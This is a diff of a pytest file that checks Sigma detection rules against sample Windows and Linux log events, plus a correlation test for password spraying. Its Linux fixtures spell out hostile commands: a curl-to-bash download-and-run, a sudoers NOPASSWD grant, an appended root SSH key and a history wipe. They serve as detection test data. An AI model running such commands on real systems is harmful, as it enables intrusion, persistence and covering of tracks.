@@ -21,9 +21,9 @@ import re
 import pytest
 
 from core import sigma
-from core.sigma_loader import (SYSMON_FIELDS, WINDOWS_FIELDS, load_dir,
-                               match_all, text_event_fields,
-                               windows_event_fields)
+from core.sigma_loader import (SYSMON_FIELDS, WINDOWS_FIELDS,
+                               journal_event_fields, load_dir, match_all,
+                               text_event_fields, windows_event_fields)
 
 ROOT = pathlib.Path(__file__).resolve().parent.parent
 RULES_DIR = ROOT / "Sentora" / "conf" / "sigma"
@@ -118,7 +118,11 @@ def _as_event(text: str) -> dict:
 
 # Password spray is the deliberate exception. It is a shape across several
 # events - one password, many accounts, one source - and stateless Sigma has
-# no way to express it. Named here rather than left as an unexplained failure.
+# no way to express it.
+#
+# It is not undetected: `core.correlation` covers it, and
+# test_the_case_sigma_cannot_express_is_covered_elsewhere below proves that
+# rather than leaving this as an unexplained hole.
 NEEDS_CORRELATION = {"constructed:t1110-password-spray"}
 
 
@@ -129,7 +133,8 @@ def test_attacks_are_caught_by_sigma_alone(case, loaded):
     """Without the AI and without the regex list. Sigma is the deterministic
     layer, and the layer that still works when the model is unavailable."""
     if case["id"] in NEEDS_CORRELATION:
-        pytest.skip("requires correlation across events, which Sigma cannot express")
+        pytest.skip("a shape across events; core.correlation covers it, see "
+                    "test_the_case_sigma_cannot_express_is_covered_elsewhere")
     hits = match_all(loaded.rules, _as_event(_message(case)))
     assert hits, f"no shipped rule fires on {case['id']}"
 
@@ -250,3 +255,104 @@ def test_a_developer_encoding_a_config_is_not_an_encoded_cradle(loaded):
         4104, ["[Convert]::FromBase64String($env:APP_CONFIG)", "C:\\dev"],
         channel="Microsoft-Windows-PowerShell/Operational")
     assert not match_all(loaded.rules, benign)
+
+
+# --------------------------------------------------------------------------
+# Linux
+# --------------------------------------------------------------------------
+#
+# The corpus is entirely Windows, so until these existed the Linux rules were
+# only known to *load*. That is the exact gap core/sigma_loader warns about: a
+# rule that loads and never matches is indistinguishable, from the console,
+# from a rule nobody wrote.
+
+LINUX_ATTACKS = [
+    ("sudoers-via-tee",
+     {"_COMM": "sudo", "_CMDLINE": "/bin/sh -c echo 'jdoe ALL=(ALL) NOPASSWD:ALL'"
+                                   " | tee -a /etc/sudoers.d/jdoe",
+      "MESSAGE": "jdoe : TTY=pts/0 ; USER=root ; COMMAND=/bin/sh -c echo"
+                 " 'jdoe ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers.d/jdoe"}),
+    ("authorized-keys-appended",
+     {"_COMM": "bash", "_CMDLINE": "bash -c echo ssh-ed25519 AAAAC3Nz..."
+                                   " >> /root/.ssh/authorized_keys",
+      "MESSAGE": "root : COMMAND=/bin/bash -c echo ssh-ed25519 AAAAC3Nz..."
+                 " >> /root/.ssh/authorized_keys"}),
+    ("curl-piped-to-shell",
+     {"_COMM": "sh", "_CMDLINE": "/bin/sh -c curl -s http://185.7.2.9/x.sh | bash",
+      "MESSAGE": "COMMAND=/bin/sh -c curl -s http://185.7.2.9/x.sh | bash"}),
+    ("history-cleared",
+     {"_COMM": "bash", "_CMDLINE": "bash -c rm -f ~/.bash_history",
+      "MESSAGE": "COMMAND=/bin/bash -c rm -f /home/jdoe/.bash_history"}),
+]
+
+LINUX_BENIGN = [
+    ("sshd-accepted-key",
+     {"_COMM": "sshd", "_CMDLINE": "/usr/sbin/sshd -D",
+      "MESSAGE": "Accepted publickey for jdoe from 10.0.0.9 port 51234 ssh2"}),
+    ("apt-install",
+     {"_COMM": "apt", "_CMDLINE": "apt-get install -y nginx",
+      "MESSAGE": "Setting up nginx (1.24.0-1) ..."}),
+    ("cron-backup",
+     {"_COMM": "CRON", "_CMDLINE": "/usr/sbin/cron -f",
+      "MESSAGE": "(root) CMD (/usr/local/bin/backup.sh >> /var/log/backup.log)"}),
+    # The one most likely to be got wrong: a download that is not piped
+    # anywhere. Fetching a release tarball is not execution.
+    ("curl-to-a-file",
+     {"_COMM": "curl", "_CMDLINE": "curl -o /tmp/rel.tgz https://vendor/rel.tgz",
+      "MESSAGE": "COMMAND=curl -o /tmp/rel.tgz https://vendor/rel.tgz"}),
+]
+
+
+@pytest.mark.parametrize("name,entry", LINUX_ATTACKS, ids=[c[0] for c in LINUX_ATTACKS])
+def test_linux_rules_fire_on_the_journal(name, entry, loaded):
+    assert match_all(loaded.rules, journal_event_fields(entry)), name
+
+
+@pytest.mark.parametrize("name,entry", LINUX_BENIGN, ids=[c[0] for c in LINUX_BENIGN])
+def test_linux_rules_stay_quiet_on_ordinary_activity(name, entry, loaded):
+    hits = match_all(loaded.rules, journal_event_fields(entry))
+    assert not hits, f"{name} falsely matched {[h.title for h in hits]}"
+
+
+@pytest.mark.parametrize("name,entry", LINUX_ATTACKS, ids=[c[0] for c in LINUX_ATTACKS])
+def test_linux_rules_also_work_on_a_plain_syslog_line(name, entry, loaded):
+    """Deliberate, and the reason each Linux rule carries `Message|contains`
+    alternatives beside its `CommandLine` ones.
+
+    A syslog line has no named fields, so a rule written only against
+    `CommandLine` - which is how the Windows rules are written, correctly -
+    would be dead on any host using rsyslog rather than journald. sudo logs
+    the command it ran into the message text, and that is enough to match on.
+    """
+    line = f"Aug 25 03:14:07 web-01 sudo: {entry['MESSAGE']}"
+    assert match_all(loaded.rules, text_event_fields(line, "/var/log/auth.log")), name
+
+
+def test_every_linux_rule_is_exercised_by_these_cases(loaded):
+    """Otherwise a rule could be added, never fire, and nothing would say so."""
+    linux = {r.title for r in loaded.rules
+             if str(r.logsource.get("product", "")).lower() == "linux"}
+    fired = {h.title for _, entry in LINUX_ATTACKS
+             for h in match_all(loaded.rules, journal_event_fields(entry))}
+    assert linux - fired == set(), f"Linux rules never exercised: {linux - fired}"
+
+
+def test_the_case_sigma_cannot_express_is_covered_elsewhere():
+    """The skip above is only defensible if something else catches it.
+
+    A test that skips with a good reason and no follow-up is how a gap gets
+    documented into permanence: every run reports a reason, nobody reports a
+    missing detection.
+    """
+    from core.correlation import default_engine
+
+    engine = default_engine()
+    found = []
+    for i, user in enumerate(("jdoe", "asmith", "rpatel", "mchen", "klopez")):
+        found += engine.observe(
+            {"EventID": "4625", "TargetUserName": user,
+             "IpAddress": "10.20.30.41", "LogonType": "3"},
+            now=1000.0 + i * 8)
+
+    assert [d.rule for d in found] == ["password_spray"]
+    assert "T1110.003" in found[0].techniques
